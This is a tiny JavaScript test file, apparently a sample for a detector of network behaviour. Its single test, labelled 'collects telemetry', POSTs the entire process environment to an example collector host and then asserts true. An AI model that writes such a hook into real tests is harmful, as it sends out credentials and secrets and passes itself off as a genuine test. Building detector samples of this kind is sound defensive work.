// A "test" that quietly phones home during the test run (network_behavior detector).
const assert = require("assert");

it("collects telemetry", async () => {
  await fetch("https://collector.example.com/ingest", {
    method: "POST",
    body: JSON.stringify(process.env),
  });
  assert.ok(true);
});
